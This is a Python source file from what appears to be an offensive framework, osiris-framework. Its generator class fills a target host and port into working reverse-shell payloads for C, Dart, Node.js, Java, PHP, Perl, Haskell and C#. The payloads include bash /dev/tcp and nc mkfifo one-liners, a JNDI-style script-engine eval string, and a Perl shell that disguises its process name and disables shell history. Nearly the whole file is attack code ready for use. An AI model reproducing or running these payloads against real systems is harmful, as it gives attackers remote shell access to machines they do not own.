#!/usr/bin/env python3
# Project: osiris-framework
# Author: Samir Sanchez Garnica @sasaga92
# Version 1.0
# Date: 01/12/2022

from utilities.Colors import color


class TemplateGenerator:

    def __init__(self, **kwargs):
        self.__status = {'message': '', 'code': 0}
        self.__language = None
        self.__payload = None
        self.__type = None
        self.__platform_permitted = ['linux', 'windows', 'mac']
        self.__type_permitted = ['bind', 'reverse']

        try:
            self.__platform = kwargs['platform'].strip().lower()
            self.__target = kwargs['target']
            self.__port = str(kwargs['port'])
            self.__type = str(kwargs['type'])
        except KeyError as Error:
            self.__status['code'] = 500
            self.__status['message'] = color.color("lgray", "The parameters ") + color.color("yellow",
                                                                                             "{") + color.color("lgray",
                                                                                                                Error) + color.color(
                "yellow", "} ") + color.color("lgray", "are mandatory in the class") + color.color("yellow",
                                                                                                   " ShellGenerator")

            if 'platform' in Error.args[0]:
                self.__platform = ""

        if not self.__platform in self.__platform_permitted:
            self.__status['message'] = color.color("lgray", "The parameters ") + color.color("yellow",
                                                                                             "{") + color.color("lgray",
                                                                                                                'platform') + color.color(
                "yellow", "} ") + color.color("lgray", "not is valid in the class") + color.color("yellow",
                                                                                                  " ShellGenerator")
        if not self.__type in self.__type_permitted:
            self.__status['message'] = color.color("lgray", "The parameters ") + color.color("yellow",
                                                                                             "{") + color.color("lgray",
                                                                                                                'type') + color.color(
                "yellow", "} ") + color.color("lgray", "not is valid in the class") + color.color("yellow",
                                                                                                  " ShellGenerator")

    def C(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "#include <stdio.h>\n" \
                                 "#include <sys/socket.h>\n" \
                                 "#include <sys/types.h>\n" \
                                 "#include <stdlib.h>\n" \
                                 "#include <unistd.h>\n" \
                                 "#include <netinet/in.h>\n" \
                                 "#include <arpa/inet.h>\n" \
                                 "\n" \
                                 "int main(void){\n" \
                                 "    int port = " + self.__port + ";\n" \
                                                                   "    struct sockaddr_in revsockaddr;\n" \
                                                                   "\n" \
                                                                   "    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n" \
                                                                   "    revsockaddr.sin_family = AF_INET;\n" \
                                                                   "    revsockaddr.sin_port = htons(port);\n" \
                                                                   "    revsockaddr.sin_addr.s_addr = inet_addr(\"" + self.__target + "\");\n" \
                                                                                                                                      "\n" \
                                                                                                                                      "    connect(sockt, (struct sockaddr *) &revsockaddr,\n" \
                                                                                                                                      "    sizeof(revsockaddr));\n" \
                                                                                                                                      "    dup2(sockt, 0);\n" \
                                                                                                                                      "    dup2(sockt, 1);\n" \
                                                                                                                                      "    dup2(sockt, 2);\n" \
                                                                                                                                      "\n" \
                                                                                                                                      "    char * const argv[] = {\"/bin/bash\", NULL};\n" \
                                                                                                                                      "    execve(\"/bin/bash\", argv, NULL);\n" \
                                                                                                                                      "    return 0;\n" \
                                                                                                                                      "}"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']
        return self.__status

    def Dart(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "import \'dart:io\';\n" \
                                 "import \'dart:convert\';\n" \
                                 " \n" \
                                 "main() {\n" \
                                 "  Socket.connect(\""+self.__target+"\", "+self.__port+").then((socket) {\n" \
                                 "    socket.listen((data) {\n" \
                                 "      Process.start(\'/bin/bash\', []).then((Process process) {\n" \
                                 "        process.stdin.writeln(new String.fromCharCodes(data).trim());\n" \
                                 "        process.stdout\n" \
                                 "          .transform(utf8.decoder)\n" \
                                 "          .listen((output) { socket.write(output); });\n" \
                                 "      });\n" \
                                 "    },\n" \
                                 "    onDone: () {\n" \
                                 "      socket.destroy();\n" \
                                 "    });\n" \
                                 "  });\n" \
                                 "}\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']

        return self.__status

    def Nodejs(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "(function(){\n" \
                                 "   var net = require(\"net\"),\n" \
                                 "       cp = require(\"child_process\"),\n" \
                                 "       sh = cp.spawn(\"/bin/bash\", []);\n" \
                                 "    var client = new net.Socket();\n" \
                                 "   client.connect("+self.__port+", \""+self.__target+"\", function(){\n" \
                                 "        client.pipe(sh.stdin);\n" \
                                 "        sh.stdout.pipe(client);\n" \
                                 "        sh.stderr.pipe(client);\n" \
                                 "    });\n" \
                                 "    return /a/; // Prevents the Node.js application from crashing\n" \
                                 "})();\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']

        return self.__status

    def Java(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "public class shell {\n" \
                                 "    public static void main(String[] args) {\n" \
                                 "        Process p;\n" \
                                 "        try {\n" \
                                 "            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/"+self.__target+"/"+self.__port+" 0>&1\");\n" \
                                 "            p.waitFor();\n" \
                                 "            p.destroy();\n" \
                                 "        } catch (Exception e) {}\n" \
                                 "    }\n" \
                                 "}"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']

        return self.__status

    def Java_2(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "public class shell {\n" \
                                 "    public static void main(String[] args) {\n" \
                                 "        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/"+self.__target+"/"+self.__port+" 0>&1\")\n" \
                                 "            .redirectErrorStream(true);\n" \
                                 "        try {\n" \
                                 "            Process p = pb.start();\n" \
                                 "            p.waitFor();\n" \
                                 "            p.destroy();\n" \
                                 "        } catch (Exception e) {}\n" \
                                 "    }\n" \
                                 "}\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']

        return self.__status

    def Java_3(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "import java.io.InputStream;\n" \
                                 "import java.io.OutputStream;\n" \
                                 "import java.net.Socket;\n" \
                                 "\n" \
                                 "public class shell {\n" \
                                 "    public static void main(String[] args) {\n" \
                                 "        String host = \""+self.__target+"\";\n" \
                                 "        int port = "+self.__port+";\n" \
                                 "        String cmd = \"/bin/bash\";\n" \
                                 "        try {\n" \
                                 "            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n" \
                                 "            Socket s = new Socket(host, port);\n" \
                                 "            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n" \
                                 "            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n" \
                                 "            while (!s.isClosed()) {\n" \
                                 "                while (pi.available() > 0)\n" \
                                 "                    so.write(pi.read());\n" \
                                 "                while (pe.available() > 0)\n" \
                                 "                    so.write(pe.read());\n" \
                                 "                while (si.available() > 0)\n" \
                                 "                    po.write(si.read());\n" \
                                 "                so.flush();\n" \
                                 "                po.flush();\n" \
                                 "                Thread.sleep(50);\n" \
                                 "                try {\n" \
                                 "                    p.exitValue();\n" \
                                 "                    break;\n" \
                                 "                } catch (Exception e) {}\n" \
                                 "            }\n" \
                                 "            p.destroy();\n" \
                                 "            s.close();\n" \
                                 "        } catch (Exception e) {}\n" \
                                 "    }\n" \
                                 "}\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']

        return self.__status

    def Javascript(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "String command = \"var host = \'"+self.__target+"\';  \" +\n \
                           \"var port = "+self.__port+"; \" +\n" " \
                           \"var cmd = \'/bin/bash\'; \" +\n" "\
                           \"var s = new java.net.Socket(host, port); \" +\n" " \
                           \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start(); \" +\n" " \
                           \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); \" +\n" " \
                           \"var po = p.getOutputStream(), so = s.getOutputStream(); \" +\n" " \
                           \"print (\'Connected\'); \" +\n" " \
                           \"while (!s.isClosed()) {\" +\n" " \
                           \"    while (pi.available() > 0)\" +\n" " \
                           \"        so.write(pi.read()); \" +\n" " \
                           \"    while (pe.available() > 0)\" +\n" " \
                           \"        so.write(pe.read()); \" +\n" " \
                           \"    while (si.available() > 0)\" +\n" " \
                           \"        po.write(si.read()); \" +\n" " \
                           \"    so.flush(); \" +\n" " \
                           \"    po.flush(); \" +\n" " \
                           \"    java.lang.Thread.sleep(50); \" +\n" " \
                           \"    try {\" +\n" " \
                           \"        p.exitValue(); \" +\n" " \
                           \"        break; \" +\n" " \
                           \"    }\" +\n" " \
                           \"    catch(e){\" +\n" " \
                           \"    }\" +\n" " \
                           \"}\" +\n" " \
                           \"p.destroy(); \" +\n" " \
                           \"s.close();\";\n" \
                            "String x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\");\n" \
                            "ref.add(new StringRefAddr(\"x\", x);"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']

        return self.__status

    def PHP(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "<?php\n" \
                                 "// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n" \
                                 "// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n" \
                                 "\n" \
                                 "set_time_limit (0);\n" \
                                 "$VERSION = \"1.0\";\n" \
                                 "$ip = \'" + self.__target + "\';\n" \
                                                              "$port = " + self.__port + ";\n" \
                                                                                         "$chunk_size = 1400;\n" \
                                                                                         "$write_a = null;\n" \
                                                                                         "$error_a = null;\n" \
                                                                                         "$shell = \'uname -a; w; id; /bin/bash -i\';\n" \
                                                                                         "$daemon = 0;\n" \
                                                                                         "$debug = 0;\n" \
                                                                                         "\n" \
                                                                                         "if (function_exists(\'pcntl_fork\')) {\n" \
                                                                                         "    $pid = pcntl_fork();\n" \
                                                                                         "\n" \
                                                                                         "    if ($pid == -1) {\n" \
                                                                                         "        printit(\"ERROR: Can\'t fork\");\n" \
                                                                                         "        exit(1);\n" \
                                                                                         "    }\n" \
                                                                                         "\n" \
                                                                                         "    if ($pid) {\n" \
                                                                                         "        exit(0); // Parent exits\n" \
                                                                                         "    }\n" \
                                                                                         "    if (posix_setsid() == -1) { \n" \
                                                                                         "        printit(\"Error: Can\'t setsid()\");\n" \
                                                                                         "        exit(1);\n" \
                                                                                         "    }\n" \
                                                                                         "\n" \
                                                                                         "    $daemon = 1;\n" \
                                                                                         "} else {\n" \
                                                                                         "    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n" \
                                                                                         "}\n" \
                                                                                         "\n" \
                                                                                         "chdir(\"/\");\n" \
                                                                                         "\n" \
                                                                                         "umask(0);\n" \
                                                                                         "\n" \
                                                                                         "// Open reverse connection\n" \
                                                                                         "$sock = fsockopen($ip, $port, $errno, $errstr, 30);\n" \
                                                                                         "if (!$sock) {\n" \
                                                                                         "	printit(\"$errstr ($errno)\");\n" \
                                                                                         "	exit(1);\n" \
                                                                                         "}\n" \
                                                                                         "\n" \
                                                                                         "$descriptorspec = array(\n" \
                                                                                         "   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n" \
                                                                                         "   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n" \
                                                                                         "   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n" \
                                                                                         ");\n" \
                                                                                         "\n" \
                                                                                         "$process = proc_open($shell, $descriptorspec, $pipes);\n" \
                                                                                         "\n" \
                                                                                         "if (!is_resource($process)) {\n" \
                                                                                         "	printit(\"ERROR: Can\'t spawn shell\");\n" \
                                                                                         "	exit(1);\n" \
                                                                                         "}\n" \
                                                                                         "\n" \
                                                                                         "stream_set_blocking($pipes[0], 0);\n" \
                                                                                         "stream_set_blocking($pipes[1], 0);\n" \
                                                                                         "stream_set_blocking($pipes[2], 0);\n" \
                                                                                         "stream_set_blocking($sock, 0);\n" \
                                                                                         "\n" \
                                                                                         "printit(\"Successfully opened reverse shell to $ip:$port\");\n" \
                                                                                         "\n" \
                                                                                         "while (1) {\n" \
                                                                                         "	if (feof($sock)) {\n" \
                                                                                         "		printit(\"ERROR: Shell connection terminated\");\n" \
                                                                                         "		break;\n" \
                                                                                         "	}\n" \
                                                                                         "\n" \
                                                                                         "	if (feof($pipes[1])) {\n" \
                                                                                         "		printit(\"ERROR: Shell process terminated\");\n" \
                                                                                         "		break;\n" \
                                                                                         "	}\n" \
                                                                                         "\n" \
                                                                                         "$read_a = array($sock, $pipes[1], $pipes[2]);\n" \
                                                                                         "	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n" \
                                                                                         "\n" \
                                                                                         "	if (in_array($sock, $read_a)) {\n" \
                                                                                         "	if ($debug) printit(\"SOCK READ\");\n" \
                                                                                         "		$input = fread($sock, $chunk_size);\n" \
                                                                                         "	if ($debug) printit(\"SOCK: $input\");\n" \
                                                                                         "		fwrite($pipes[0], $input);\n" \
                                                                                         "	}\n" \
                                                                                         "\n" \
                                                                                         "	if (in_array($pipes[1], $read_a)) {\n" \
                                                                                         "	if ($debug) printit(\"STDOUT READ\");\n" \
                                                                                         "		$input = fread($pipes[1], $chunk_size);\n" \
                                                                                         "	if ($debug) printit(\"STDOUT: $input\");\n" \
                                                                                         "		fwrite($sock, $input);\n" \
                                                                                         "	}\n" \
                                                                                         "\n" \
                                                                                         "	if (in_array($pipes[2], $read_a)) {\n" \
                                                                                         "	if ($debug) printit(\"STDERR READ\");\n" \
                                                                                         "		$input = fread($pipes[2], $chunk_size);\n" \
                                                                                         "	if ($debug) printit(\"STDERR: $input\");\n" \
                                                                                         "		fwrite($sock, $input);\n" \
                                                                                         "	}\n" \
                                                                                         "}\n" \
                                                                                         "fclose($sock);\n" \
                                                                                         "fclose($pipes[0]);\n" \
                                                                                         "fclose($pipes[1]);\n" \
                                                                                         "fclose($pipes[2]);\n" \
                                                                                         "proc_close($process);\n" \
                                                                                         "\n" \
                                                                                         "function printit ($string) {\n" \
                                                                                         "	if (!$daemon) {\n" \
                                                                                         "		print \"$string\\n\";\n" \
                                                                                         "	}\n" \
                                                                                         "}\n" \
                                                                                         "\n" \
                                                                                         "?>\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                      str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']

        return self.__status

    def Perl(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "use strict;                                                             \n" \
                                 "use Socket;                                                             \n" \
                                 "use FileHandle;                                                         \n" \
                                 "use POSIX;                                                              \n" \
                                 "my $VERSION = \"1.0\";                                                    \n" \
                                 "                                                                       \n" \
                                 "# Where to send the reverse shell.  Change these.                      \n" \
                                 "my $ip = \'" + self.__target + "\';                                         \n" \
                                                                 "my $port = " + self.__port + ";                                              \n" \
                                                                                               "\n" \
                                                                                               "# Options                                                              \n" \
                                                                                               "my $daemon = 1;                                                         \n" \
                                                                                               "my $auth   = 0; # 0 means authentication is disabled and any            \n" \
                                                                                               "# source IP can access the reverse shell                         \n" \
                                                                                               "my $authorised_client_pattern = qr(^127\.0\.0\.1$);                     \n" \
                                                                                               "\n" \
                                                                                               "# Declarations                                                         \n" \
                                                                                               "my $global_page = \"\";                                                   \n" \
                                                                                               "my $fake_process_name = \"/usr/sbin/apache\";                             \n" \
                                                                                               "\n" \
                                                                                               "# Change the process name to be less conspicious                       \n" \
                                                                                               "$0 = \"[httpd]\";                                                         \n" \
                                                                                               "\n" \
                                                                                               "# Authenticate based on source IP address if required                  \n" \
                                                                                               "if (defined($ENV{\'REMOTE_ADDR\'})) {                                     \n" \
                                                                                               "	cgiprint(\"Browser IP address appears to be: $ENV{\'REMOTE_ADDR\'}\");   \n" \
                                                                                               "                                                                            \n" \
                                                                                               "	if ($auth) {                                                         \n" \
                                                                                               "		unless ($ENV{\'REMOTE_ADDR\'} =~ $authorised_client_pattern) {     \n" \
                                                                                               "			cgiprint(\"ERROR: Your client isn\'t authorised to view this page\n" \
                                                                                               "			cgiexit();                                                   \n" \
                                                                                               "		}                                                                \n" \
                                                                                               "	}                                                                    \n" \
                                                                                               "} elsif ($auth) {                                                      \n" \
                                                                                               "	cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\"); \n" \
                                                                                               "	cgiexit(0);                                                          \n" \
                                                                                               "}                                                                      \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Background and dissociate from parent process if required            \n" \
                                                                                               "if ($daemon) {                                                          \n" \
                                                                                               "	my $pid = fork();                                                    \n" \
                                                                                               "	if ($pid) {                                                          \n" \
                                                                                               "		cgiexit(0); # parent exits                                       \n" \
                                                                                               "	}                                                                    \n" \
                                                                                               "                                                                       \n" \
                                                                                               "	setsid();                                                            \n" \
                                                                                               "	chdir(\'/\');                                                          \n" \
                                                                                               "	umask(0);                                                            \n" \
                                                                                               "}                                                                      \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Make TCP connection for reverse shell                                \n" \
                                                                                               "socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname(\'tcp\'));              \n" \
                                                                                               "if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {                 \n" \
                                                                                               "	cgiprint(\"Sent reverse shell to $ip:$port\");                         \n" \
                                                                                               "	cgiprintpage();                                                      \n" \
                                                                                               "} else {                                                               \n" \
                                                                                               "	cgiprint(\"Couldn\'t open reverse shell to $ip:$port: $!\");            \n" \
                                                                                               "	cgiexit();	                                                         \n" \
                                                                                               "}                                                                      \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Redirect STDIN, STDOUT and STDERR to the TCP connection              \n" \
                                                                                               "open(STDIN, \">&SOCK\");                                                  \n" \
                                                                                               "open(STDOUT,\">&SOCK\");                                                  \n" \
                                                                                               "open(STDERR,\">&SOCK\");                                                  \n" \
                                                                                               "$ENV{\'HISTFILE\'} = \'/dev/null\';                                        \n" \
                                                                                               "system(\"w;uname -a;id;pwd\");                                            \n" \
                                                                                               "exec({\"/bin/bash\"} ($fake_process_name, \"-i\"));                         \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Wrapper around print                                                 \n" \
                                                                                               "sub cgiprint {                                                          \n" \
                                                                                               "	my $line = shift;                                                    \n" \
                                                                                               "	$line .= \"<p>\\n\";                                                    \n" \
                                                                                               "	$global_page .= $line;                                               \n" \
                                                                                               "}                                                                      \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Wrapper around exit                                                  \n" \
                                                                                               "sub cgiexit {                                                           \n" \
                                                                                               "	cgiprintpage();                                                      \n" \
                                                                                               "	exit 0; # 0 to ensure we don\'t give a 500 response.                  \n" \
                                                                                               "}                                                                      \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Form HTTP response using all the messages gathered by cgiprint so far\n" \
                                                                                               "sub cgiprintpage {                                                      \n" \
                                                                                               "	print \"Content-Length: \" . length($global_page) . \"\\r                \n" \
                                                                                               "Connection: close\\r                                                     \n" \
                                                                                               "Content-Type: text\\/html\\r\\n\\r\\n\" . $global_page;                       \n" \
                                                                                               "}                                                                      \n"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']

        return self.__status

    def Haskell_1(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "module Main where\n" \
                                 "\n" \
                                 "import System.Process\n" \
                                 "\n" \
                                 "main = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc " + self.__target + " " + self.__port + "  >/tmp/f\"\n"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']

        return self.__status

    def CsharpBash_i(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "using System;\n" \
                                 "using System.Diagnostics;\n" \
                                 "\n" \
                                 "namespace BackConnect {\n" \
                                 "  class ReverseBash {\n" \
                                 "	public static void Main(string[] args) {\n" \
                                 "	  Process proc = new System.Diagnostics.Process();\n" \
                                 "	  proc.StartInfo.FileName = \"/bin/bash\";\n" \
                                 "	  proc.StartInfo.Arguments = \"-c \\\"/bin/bash -i >& /dev/tcp/" + self.__target + "/" + self.__port + " 0>&1\\\"\";\n" \
                                                                                                                                             "	  proc.StartInfo.UseShellExecute = false;\n" \
                                                                                                                                             "	  proc.StartInfo.RedirectStandardOutput = true;\n" \
                                                                                                                                             "	  proc.Start();\n" \
                                                                                                                                             "\n" \
                                                                                                                                             "	  while (!proc.StandardOutput.EndOfStream) {\n" \
                                                                                                                                             "		Console.WriteLine(proc.StandardOutput.ReadLine());\n" \
                                                                                                                                             "	  }\n" \
                                                                                                                                             "	}\n" \
                                                                                                                                             "  }\n" \
                                                                                                                                             "}\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']

        return self.__status

    def CsharpTcpClient(self):
        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
            try:
                self.__payload = "using System;\n" \
                                 "using System.Text;\n" \
                                 "using System.IO;\n" \
                                 "using System.Diagnostics;\n" \
                                 "using System.ComponentModel;\n" \
                                 "using System.Linq;\n" \
                                 "using System.Net;\n" \
                                 "using System.Net.Sockets;\n" \
                                 "\n" \
                                 "\n" \
                                 "namespace ConnectBack\n" \
                                 "{\n" \
                                 "  public class Program\n" \
                                 "  {\n" \
                                 "    static StreamWriter streamWriter;\n" \
                                 "\n" \
                                 "    public static void Main(string[] args)\n" \
                                 "    {\n" \
                                 "      using(TcpClient client = new TcpClient(\"" + self.__target + "\", " + str(
                    self.__port) + "))" \
                                   "      {\n" \
                                   "        using(Stream stream = client.GetStream())\n" \
                                   "        {\n" \
                                   "          using(StreamReader rdr = new StreamReader(stream))" \
                                   "          {\n" \
                                   "            streamWriter = new StreamWriter(stream);\n" \
                                   "\n" \
                                   "            StringBuilder strInput = new StringBuilder();\n" \
                                   "\n" \
                                   "            Process p = new Process();\n" \
                                   "            p.StartInfo.FileName = \"/bin/bash\";\n" \
                                   "            p.StartInfo.CreateNoWindow = true;\n" \
                                   "            p.StartInfo.UseShellExecute = false;\n" \
                                   "            p.StartInfo.RedirectStandardOutput = true;\n" \
                                   "            p.StartInfo.RedirectStandardInput = true;\n" \
                                   "            p.StartInfo.RedirectStandardError = true;\n" \
                                   "            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n" \
                                   "            p.Start();\n" \
                                   "            p.BeginOutputReadLine();\n" \
                                   "\n" \
                                   "            while(true)\n" \
                                   "            {\n" \
                                   "              strInput.Append(rdr.ReadLine());\n" \
                                   "              p.StandardInput.WriteLine(strInput);\n" \
                                   "              strInput.Remove(0, strInput.Length);\n" \
                                   "             }\n" \
                                   "           }\n" \
                                   "         }\n" \
                                   "       }\n" \
                                   "    }\n" \
                                   "\n" \
                                   "    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n" \
                                   "    {\n" \
                                   "        StringBuilder strOutput = new StringBuilder();\n" \
                                   "    \n" \
                                   "        if (!String.IsNullOrEmpty(outLine.Data))\n" \
                                   "        {\n" \
                                   "            try\n" \
                                   "            {\n" \
                                   "                strOutput.Append(outLine.Data);\n" \
                                   "                streamWriter.WriteLine(strOutput);\n" \
                                   "                streamWriter.Flush();\n" \
                                   "            }\n" \
                                   "            catch (Exception err) { }\n" \
                                   "        }\n" \
                                   "     }\n" \
                                   "  \n" \
                                   "  }\n" \
                                   "}\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        else:
            self.__status['code'] = 500
            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
                                                                                "Platform or type payload not allowed for this payload") if len(
                self.__status['message']) == 0 else self.__status['message']

        return self.__status
